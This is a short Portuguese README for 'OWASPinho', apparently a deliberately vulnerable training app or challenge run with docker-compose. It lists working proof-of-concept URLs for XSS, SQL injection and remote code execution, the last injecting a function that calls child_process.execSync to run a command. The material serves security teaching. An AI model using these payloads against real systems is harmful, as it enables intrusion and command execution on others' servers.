# OWASPinho
- [OWASPinho](#owaspinho)
  - [Desafio](#desafio)
  - [Execução](#execução)
  - [Vulnerabilidades](#vulnerabilidades)
    - [XSS](#xss)
    - [SQL Injection](#sql-injection)
    - [RCE](#rce)



## Desafio

Leia as instruções [aqui](DESAFIO.md).

## Execução

```
$ unzip owaspinho.zip
$ cd owaspinho
$ docker-compose up
```

![](https://res.cloudinary.com/dtr6hzxnx/image/upload/v1681241692/Via/2023-04-11_16.24.37_kmoglj.gif)

![image-20230411163617555](images/image-20230411163617555.png)


## Vulnerabilidades 
### XSS
```
/?userInput=<script>alert(1)</script>
```
### SQL Injection
```
/users?username='+or+1=1--&access-token=' 
```
### RCE
```
/users/has-access?userId=1&resourceId=42&userAccessCheck=function(userId,%20resourceId)%20{%20return%20require('child_process').execSync('ping+-c+4+localhost').toString();%20}
```